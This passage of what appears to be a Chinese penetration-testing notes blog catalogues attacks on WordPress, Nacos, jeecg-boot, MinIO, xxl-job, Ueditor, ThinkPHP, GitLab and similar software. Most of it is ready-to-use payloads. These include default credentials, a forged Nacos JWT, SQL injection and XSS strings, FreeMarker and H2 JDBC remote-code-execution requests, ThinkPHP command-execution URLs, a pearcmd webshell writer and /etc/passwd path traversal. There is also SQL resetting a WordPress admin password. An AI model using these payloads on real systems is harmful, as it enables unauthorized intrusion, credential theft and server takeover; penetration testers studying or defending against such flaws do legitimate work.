class="string">/?m=login&amp;a=getoption&amp;ajaxbool=true&amp;num=aaaa\</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">Client-ip:111&#x27;,web=0x3C7363726970743E616C65727428787373293C2F7363726970743E--</span><br></pre></td></tr></table></figure><blockquote><p>web&#x3D; [XSS代码的hex编码]+[(tab键)–(tab键)]</p></blockquote><p>查看日志处触发xss代码</p></li></ul><h3 id="Wordpress"><a href="#Wordpress" class="headerlink" title="Wordpress"></a>Wordpress</h3><ul><li>进后台</li><li>前台找插件，扫备份文件</li></ul><p><a href="https://mp.weixin.qq.com/s/kJDo2725ztlAO2HCnANOlg">干货 | Wordpress网站渗透方法指南 (qq.com)</a></p><p><a href="https://wpscan.com/">WPScan: WordPress Security Scanner</a></p><p><a href="https://www.jianshu.com/p/42e3b065ad76">WordPress xmlrpc.php 漏洞利用 - 简书 (jianshu.com)</a></p><blockquote><p>我只能收到dnslog</p></blockquote><p>密码重置</p><blockquote><p>哥斯拉的数据库只能执行查询操作</p><p>冰蝎的数据库要自己进行sql操作</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> wp_users limit <span class="number">0</span>,<span class="number">20</span></span><br><span class="line"><span class="keyword">update</span> wp_users <span class="keyword">set</span> user_pass<span class="operator">=</span>md5(&quot;test&quot;)  <span class="keyword">where</span> user_login<span class="operator">=</span>&quot;oY_Zb5ADu0lV2QM0KarP6y6MrLus&quot;</span><br></pre></td></tr></table></figure><h3 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h3><p><a href="https://fgtbnc.github.io/2023/06/22/spring%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Spring框架漏洞 | Khaz (fgtbnc.github.io)</a></p><h3 id="Nacos"><a href="#Nacos" class="headerlink" title="Nacos"></a>Nacos</h3><blockquote><p>一个易于使用的动态服务发现、配置和服务管理平台，用于构建云原生应用程序。</p><p><img src="/../images/image-20230715105449674.png" alt="image-20230715105449674"></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">默认口令（CNVD-2021-24491）</span><br><span class="line">nacos/nacos</span><br><span class="line"></span><br><span class="line">未授权访问</span><br><span class="line">-任意用户查看 /nacos/v1/auth/users?pageNo=1&amp;pageSize=2</span><br><span class="line">-任意用户注册 /nacos/v1/auth/users  POST：username=crow&amp;password=crow</span><br><span class="line">-User-Agent: Nacos-Server（低版本直接访问url，1.2~1.4可以尝试添加UA头来绕过鉴权）</span><br><span class="line"></span><br><span class="line">Nacos 默认 secret.key 配置不当权限绕过漏洞（CNVD-2023674205）</span><br><span class="line">-Nacos &lt;= 2.2.0</span><br><span class="line">-https://www.anquanke.com/post/id/288930</span><br><span class="line">-利用默认secret.key生成JWT Token，从而造成权限绕过访问到相关API接口</span><br><span class="line">-/nacos/v1/auth/users?pageNo=1&amp;pageSize=2&amp;accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc5OTMxODM3OH0.jR1idVKGeickN20hffQzb80Yp2qQx5m8ApKf5BeR05g  （我生成的2027年过期的）</span><br><span class="line">-或者/nacos/v1/auth/users?pageNo=1&amp;pageSize=2 添加accessToken:JWT （失败）</span><br><span class="line"></span><br><span class="line">进入后台后</span><br><span class="line">-节点列表和配置情况，找一下有没有key</span><br><span class="line">-可能存在反序列化漏洞</span><br></pre></td></tr></table></figure><h3 id="alibaba-druid-monitor"><a href="#alibaba-druid-monitor" class="headerlink" title="alibaba druid monitor"></a>alibaba druid monitor</h3><blockquote><h5 id="Druid是阿里巴巴数据库事业部出品，为监控而生的数据库连接池"><a href="#Druid是阿里巴巴数据库事业部出品，为监控而生的数据库连接池" class="headerlink" title="Druid是阿里巴巴数据库事业部出品，为监控而生的数据库连接池"></a><strong>Druid是阿里巴巴数据库事业部出品，为监控而生的数据库连接池</strong></h5><h5 id="监控SQL的执行时间、监控Web-URI的请求、Session监控"><a href="#监控SQL的执行时间、监控Web-URI的请求、Session监控" class="headerlink" title="监控SQL的执行时间、监控Web URI的请求、Session监控."></a>监控SQL的执行时间、监控Web URI的请求、Session监控.</h5><p><img src="/../images/image-20230714210240219.png" alt="image-20230714210240219"></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">未授权访问路径： </span><br><span class="line">/druid/index.html</span><br><span class="line">/druid/websession.html</span><br><span class="line">/druid/weburi.html</span><br><span class="line">    </span><br><span class="line">需要登陆的话，登录入口路径：</span><br><span class="line">/druid/login.html</span><br><span class="line"></span><br><span class="line">利用姿势：</span><br><span class="line">Session监控获取用户身份（session可能是过期的无用，需要爆破验证）</span><br><span class="line">URI获取后台路径：测试未授权访问，或者配合session进行后台操作</span><br></pre></td></tr></table></figure><h3 id="Apache-Druid"><a href="#Apache-Druid" class="headerlink" title="Apache Druid"></a>Apache Druid</h3><p>kafara反序列化</p><p><img src="/../images/image-20230624162154282.png" alt="image-20230624162154282"></p><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>工具redisexp</p><p><a href="https://paper.seebug.org/1169/#jackson">细数 redis 的几种 getshell 方法</a></p><h3 id="jeecg-boot"><a href="#jeecg-boot" class="headerlink" title="jeecg-boot"></a>jeecg-boot</h3><blockquote><p>前后端分离架构SpringBoot 2.X，SpringCloud，Ant Design&amp;Vue，Mybatis，Shiro，JWT。</p></blockquote><p>该架构的组件SpringBoot 2.X，SpringCloud，Shiro，JWT都可能存在问题。</p><ul><li><p>druid</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/jeecg-boot/druid/index.html # admin/123456</span><br></pre></td></tr></table></figure></li><li><p>actuator</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一般存在httptrace端点</span><br></pre></td></tr></table></figure></li><li><p>&#x2F;jeecg-boot&#x2F;doc.html，&#x2F;jeecg-boot&#x2F;swagger-ui.html</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Basic认证 jeecg/jeecg1314</span><br></pre></td></tr></table></figure></li><li><p>未授权查询（可以查询到用户名和电话号码）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sys/user/querySysUser?username=admin</span><br></pre></td></tr></table></figure></li><li><p>未授权sql注入（报错注入）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /jeecg-boot/jmreport/qurestSql</span><br><span class="line"></span><br><span class="line">&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27; or &#x27;%1%&#x27; like (updatexml(0x3a,concat(1,(select current_user)),1)) or &#x27;%%&#x27; like &#x27;&quot;&#125;</span><br></pre></td></tr></table></figure></li><li><p>SSTI注入</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jeecg-boot/jmreport/queryFieldBySql</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.90.1:3100</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.90.1:3100</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>123</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">&#123;&quot;sql&quot;:&quot;select &#x27;result:&lt;#assign ex=\&quot;freemarker.<span class="keyword">template</span>.utility.<span class="keyword">Execute</span>\&quot;?new()&gt; $&#123; ex(\&quot;<span class="keyword">open</span> -a calculator.app  \&quot;) &#125;&#x27; &quot;&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>JDBC</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jeecgboot/jmreport/testConnection</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.90.1:3100</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>383</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json;charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.90.1:3100</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.90.1:3100/login?redirect=/dashboard/analysis</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-powershell">&#123;</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;1&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;code&quot;</span>: <span class="string">&quot;dataSource1&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbType&quot;</span>: <span class="string">&quot;H2&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbDriver&quot;</span>: <span class="string">&quot;org.h2.Driver&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbUrl&quot;</span>: <span class="string">&quot;jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS <span class="variable">$</span><span class="variable">$</span>//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec(&#x27;open -a calculator.app&#x27;)\u000A<span class="variable">$</span><span class="variable">$</span>&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbName&quot;</span>: <span class="string">&quot;test&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbUsername&quot;</span>: <span class="string">&quot;sa&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbPassword&quot;</span>: <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;connectTimes&quot;</span>: <span class="number">5</span></span></span><br><span class="line"><span class="language-powershell">&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="VUE"><a href="#VUE" class="headerlink" title="VUE"></a>VUE</h3><p>主要是接口测试</p><ul><li><p>go-vue-admin</p><p><a href="https://www.freebuf.com/articles/network/319175.html">Gin-Vue-admin垂直越权漏洞与代码分析-CVE-2022-21660 - FreeBuf网络安全行业门户</a></p><p><img src="/../images/image-20230828171702219.png" alt="image-20230828171702219"></p><p><img src="/../images/image-20230828171740088.png" alt="image-20230828171740088"></p></li><li><p>vue-typescript-admin</p><p><img src="/../images/image-20230828171358217.png" alt="image-20230828171358217"></p></li></ul><h3 id="FastAdmins"><a href="#FastAdmins" class="headerlink" title="FastAdmins"></a>FastAdmins</h3><p><a href="https://www.loadcaps.com/posts/2bcc03cb.html">Fastadmin 漏洞合集 | Caps</a></p><p><img src="/../images/image-20230913172616785.png" alt="image-20230913172616785"></p><p><img src="/../images/image-20230724153102913.png" alt="image-20230724153102913"></p><p><img src="/../images/image-20230805193921798.png" alt="image-20230805193921798"></p><h3 id="jeeplus"><a href="#jeeplus" class="headerlink" title="jeeplus"></a>jeeplus</h3><p><a href="https://www.freebuf.com/articles/web/220066.html">代码审计入门之Jeeplus代码审计 - FreeBuf网络安全行业门户</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jeeplus后台有druid，可以尝试未授权访问</span><br><span class="line">https://xxx/api/jeeplus/druid/index.html</span><br><span class="line">https://xxx/api/jeeplus/swagger-ui.html</span><br></pre></td></tr></table></figure><h3 id="Minio"><a href="#Minio" class="headerlink" title="Minio"></a>Minio</h3><p>CVE-2023-28432 MinIO信息泄露漏洞 </p><p>未经身份认证的远程攻击者通过发送特殊HTTP请求即可获取所有环境变量，其中包括MINIO_SECRET_KEY和MINIO_ROOT_PASSWORD，造成敏感信息泄露，最终可能导致攻击者以管理员身份登录MinIO。</p><p>注意点：</p><blockquote><p>在MinIO在启动时会从环境变量中读取用户预设的管理员账号和密码，如果省略则默认账号密码为minioadmin&#x2F;minioadmin。</p><p>另外，如果开启动Minio时没有设置MINIO_ROOT_USER和MINIO_ROOT_PASSWORD，那么Minio使用默认账号密码minioadmin，这时候再做信息泄露验证会发现读取不到管理员的账号密码，则推断存在默认口令。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/v1/check-version 可以查看MinIO版本</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/minio/bootstrap/v1/verify</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure><p>根据POC改包，可以看到存在信息泄露，包含内网IP泄露等。</p><p><img src="/../images/640" alt="图片"></p><p>拿到账密进入后台之后，可以利用MinIO的自更新达到RCE  <a href="https://mp.weixin.qq.com/s/7-nWwsOLUNs7S83CiH2xMQ">MinIO自更新RCE</a></p><p><a href="https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html">CVE-2021-21287: 容器与云的碰撞——一次对MinIO的测试 | 离别歌</a></p><h3 id="xxl-job"><a href="#xxl-job" class="headerlink" title="xxl-job"></a>xxl-job</h3><ul><li><p>弱口令+后台命令执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin/123456</span><br></pre></td></tr></table></figure><p>任务管理 - 新增 运行模式使用 GLUE(Shell) </p><p>操作处选择Glue IDE写入命令执行脚本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/bin/bash</span></span><br><span class="line">cmd</span><br></pre></td></tr></table></figure><p>操作处点击执行即可</p></li><li><p>未授权RCE</p><ul><li><p>XxlJob&lt;&#x3D;2.1.2</p><p><a href="https://xz.aliyun.com/t/11091#toc-3">老曲新唱之XXL-JOB未授权Hessian2反序列化调试分析 - 先知社区 (aliyun.com)</a></p></li><li><p>XxlJob &gt;&#x3D; 2.2.0 </p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /run</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;jobId&quot;: 1,</span><br><span class="line">  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,</span><br><span class="line">  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,</span><br><span class="line">  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,</span><br><span class="line">  &quot;executorTimeout&quot;: 0,</span><br><span class="line">  &quot;logId&quot;: 1,</span><br><span class="line">  &quot;logDateTime&quot;: 1586629003729,</span><br><span class="line">  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,</span><br><span class="line">  &quot;glueSource&quot;: &quot;cmd&quot;,</span><br><span class="line">  &quot;glueUpdatetime&quot;: 1586699003758,</span><br><span class="line">  &quot;broadcastIndex&quot;: 0,</span><br><span class="line">  &quot;broadcastTotal&quot;: 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="adminer"><a href="#adminer" class="headerlink" title="adminer"></a>adminer</h3><p><img src="/../images/20220415164052-c209290a-bc97-1.png" alt="20220415164052-c209290a-bc97-1"></p><p><a href="https://xz.aliyun.com/t/11225#toc-6">一次adminer之旅 - 先知社区 (aliyun.com)</a></p><p><a href="https://www.yuque.com/challenger-sfhjb/blog/xv4gts">Adminer(&lt;4.7.9)-SSRF-众测时复现+Ffuf批量脚本 · 语雀 (yuque.com)</a></p><h3 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h3><h4 id="kindeditor-lt-x3D-4-1-11"><a href="#kindeditor-lt-x3D-4-1-11" class="headerlink" title="kindeditor&lt;&#x3D;4.1.11"></a>kindeditor&lt;&#x3D;4.1.11</h4><p>上传路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/kindeditor/asp/upload_json.asp?dir=file</span><br><span class="line">/kindeditor/asp.net/upload_json.ashx?dir=file</span><br><span class="line">/kindeditor/jsp/upload_json.jsp?dir=file</span><br><span class="line">/kindeditor/php/upload_json.php?dir=file</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/kindeditor/asp/upload_json.asp?dir=file</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>210</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryZ4ILit8qr5XXhdT5</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">------WebKitFormBoundaryZ4ILit8qr5XXhdT5</span></span><br><span class="line"><span class="language-routeros">Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">&quot;imgFile&quot;</span>; <span class="attribute">filename</span>=<span class="string">&quot;1.html&quot;</span></span></span><br><span class="line"><span class="language-routeros">Content-Type: text/html</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros">&lt;img <span class="attribute">src</span>=1 <span class="attribute">onerror</span>=alert(1)&gt;</span></span><br><span class="line"><span class="language-routeros">------WebKitFormBoundaryZ4ILit8qr5XXhdT5--</span></span><br></pre></td></tr></table></figure><h4 id="Ueditor"><a href="#Ueditor" class="headerlink" title="Ueditor"></a>Ueditor</h4><ul><li><p>SSRF</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/ueditor/jsp/getRemoteImage.jsp?upfile=url</span><br><span class="line">/ueditor/jsp/controller.jsp?action=catchimage&amp;source[]=url</span><br><span class="line">/ueditor/php/controller.php?action=catchimage&amp;source[]=url</span><br></pre></td></tr></table></figure></li><li><p>文件上传</p><ul><li><p>XSS</p><blockquote><p>Ueditor 默认支持上传 xml ：config.json可以查看支持上传的后缀</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ueditor/asp/config.json</span><br><span class="line">/ueditor/net/config.json</span><br><span class="line">/ueditor/php/config.json</span><br><span class="line">/ueditor/jsp/config.json</span><br></pre></td></tr></table></figure><p>上传PATH</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ueditor/xxx/controller.php?action=uploadfile</span><br><span class="line">/ueditor/xxx/controller.php?action=uploadimage</span><br></pre></td></tr></table></figure></li><li><p>.net下GetShell</p><blockquote><p>服务器上存放名为666.jpg的图片马</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/替换漏洞URL地址拼接/UEditor/net/controller.ashx?action=catchimage</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>x.x.x.x</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;100&quot;, &quot;Chromium&quot;;v=&quot;100&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>49</span><br><span class="line"></span><br><span class="line"><span class="language-jboss-cli">source[]=http:<span class="string">//</span>替换为自己服务器开启http服务的URL地址<span class="string">/666.jpg</span>?<span class="string">.aspx</span></span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="帆软"><a href="#帆软" class="headerlink" title="帆软"></a>帆软</h3><p><a href="https://help.fanruan.com/finereport/doc-view-4833.html">安全漏洞声明- FineReport帮助文档 - 全面的报表使用教程和学习资料</a></p><p>能够作为致远OA的组件</p><ul><li><p>帆软V8</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjY1MDEwNA==&mid=2247483675&idx=1&sn=3a6d8544cf5d4396b21d49ab91bd59bf&chksm=cf2e4a0cf859c31ab0703576966a1c46dd565e29cacd3fba3116ba3684923b80286ea1041e31&scene=126&sessionid=1647656066&subscene=207&key=b58103fa9e1debe406843de4e261019a638ff6adb409cef53de99d6db836986a2d16232425a37f1e3d56c18d1c08821da5713530b2aa9646cfd37bece4f874cf51cf11dcb88ca80a05286826a662b7f6515c8ad6fc7c01517ac5ab3996de95d328bd72fda95f86dbbdbb37765685dc68733dca335ff43cb90e04a003d38c1869&ascene=0&uin=MTM1NzU2MDQ1OQ==&devicetype=Windows+Server+2016+x64&version=6305002e&lang=zh_CN&exportke">帆软报表组合拳漏洞分析</a></p><p>[帆软报表 V8 get_geo_json 任意文件读取漏洞 CNVD-2018-04757 - Vuls Wiki](<a href="https://vuls.info/PeiQi/wiki/oa/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8">https://vuls.info/PeiQi/wiki/oa/帆软OA/帆软报表</a> V8 get_geo_json 任意文件读取漏洞 CNVD-2018-04757&#x2F;#_4)</p><p><a href="https://www.freesion.com/article/1056237571/">FineReport（帆软）报表系统目录遍历漏洞复现和用简易过滤器处理 - 灰信网（软件开发博客聚合）</a></p></li><li><p>帆软V9</p><p><a href="https://xz.aliyun.com/t/9578">帆软（FineReport) V9任意文件覆盖漏洞 - 先知社区</a></p></li><li><p>帆软V10</p><p>反序列化</p></li></ul><p><img src="/../images/image" alt="img"></p><p><img src="/../images/image-20230731170236076.png" alt="image-20230731170236076"></p><h3 id="Blade-X"><a href="#Blade-X" class="headerlink" title="Blade-X"></a>Blade-X</h3><p>图标</p><p><img src="/../images/favicon.png" alt="favicon"></p><p><a href="https://forum.butian.net/share/1089">奇安信攻防社区-spring-blade SQL注入漏洞 (butian.net)</a></p><p><a href="https://juejin.cn/post/7194311491175055418">转载：SpringBlade框架JWT认证缺陷漏洞CVE-2021-44910 - 掘金 (juejin.cn)</a></p><h3 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h3><ul><li><p>debug模式下</p><ul><li><p>敏感变量泄漏：比如数据库的账密</p></li><li><p>日志泄漏（这个感觉比较多）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认日志名为year_month_day.log</span></span><br><span class="line">/Application/Runtime/Logs/app_name/日志名</span><br><span class="line">/Runtime/Logs/app_name/日志名</span><br></pre></td></tr></table></figure></li><li><p>找登录日志进后台</p></li><li><p>观察sql语句进行SQL注入</p></li><li><p>cache文件getshell &lt;&#x3D; 5.10</p><blockquote><p>缓存文件：网站为了实现加速访问，会将用户访问过的页面存入缓存来减小数据库查询的开销</p><p>可能需要通过日志找到cache文件的命名方式</p></blockquote><p>默认情况下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 漏洞形成点</span></span><br><span class="line"><span class="title class_">Cache</span>::<span class="title function_ invoke__">set</span>(<span class="string">&quot;name&quot;</span>,<span class="variable">$value</span>,<span class="number">3600</span>); <span class="comment"># set(缓存标识，缓存值，缓存保留时间)</span></span><br><span class="line"><span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="variable">$data</span> . <span class="string">&quot;\n?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line"><span class="variable">$data</span>=<span class="string">&quot;%0a%0dphpinfo();//&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成的缓存文件位置</span></span><br><span class="line">/runtime/cache/<span class="title function_ invoke__">MD5</span>(name)前两位/<span class="title function_ invoke__">MD5</span>(name)后<span class="number">30</span>位.php</span><br></pre></td></tr></table></figure></li></ul></li><li><p>文件读取</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?s=index/\think\Lang/load&amp;file=/etc/passwd</span><br></pre></td></tr></table></figure></li><li><p>反序列化</p><p>两种形式payload</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line"></span><br><span class="line">POST ?s=captcha</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;s=calc&amp;method=get</span><br><span class="line"></span><br><span class="line">POST ?s=index/index</span><br><span class="line">s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=system</span><br></pre></td></tr></table></figure><p>关键是找好路由，默认是以.&#x2F;public&#x2F;index.php作为入口文件，但是很多都是二开，入口文件不一样</p><p><img src="/../images/image-20230822212120431.png" alt="image-20230822212120431"></p></li><li><p>ThinkPHP&lt;6.0.13，多语言模块写🐎（这个漏洞的知识点在CTF中出现过很多次，因为docker下的PHP环境默认满足以下前提条件）</p><p>前提条件：</p><ol><li>PHP环境开启了<code>register_argc_argv</code></li><li>PHP环境安装了pcel&#x2F;pear</li></ol><p>payload</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_REQUEST[&#x27;a&#x27;]);?&gt;+/var/www/html/a.php</span><br></pre></td></tr></table></figure><blockquote><p>记得在burp中发送，否则浏览器会将&lt;编码导致无法解析</p></blockquote></li></ul><h3 id="GitLab"><a href="#GitLab" class="headerlink" title="GitLab"></a>GitLab</h3><ul><li><p>目录穿越读取文件–CVE-2023-2825–实际利用感觉挺难的</p><p>前提条件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gitlab-ee/ce == 16.0.0</span><br><span class="line"></span><br><span class="line">存在可以达到根⽬录的嵌套可公开访问到的group项⽬⽽且存在附件(issus 评论等)</span><br><span class="line">或普通⽤户权限⼿动创建多层group和项⽬</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># 123为issue标题，uploads/dde0c86647fa452e76b94c9588d7fcbb为附件所在目录</span><br><span class="line">http://your-ip/group1/group2/group3/group4/group5/group6/group7/group8/group9/123/uploads/dde0c86647fa452e76b94c9588d7fcbb/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</span><br></pre></td></tr></table></figure></li><li><p>SSRF</p><p><a href="https://www.anquanke.com/post/id/271555">CVE-2021-22214 GITLAB SSRF 未授权漏洞-安全客 - 安全资讯平台</a></p></li><li><p>RCE</p><p><a href="https://www.anquanke.com/post/id/259862#h2-0">gitlab未授权RCE（CVE-2021-22205）漏洞复现及深入利用-安全客 - 安全资讯平台</a></p></li><li><p>信息泄漏</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST 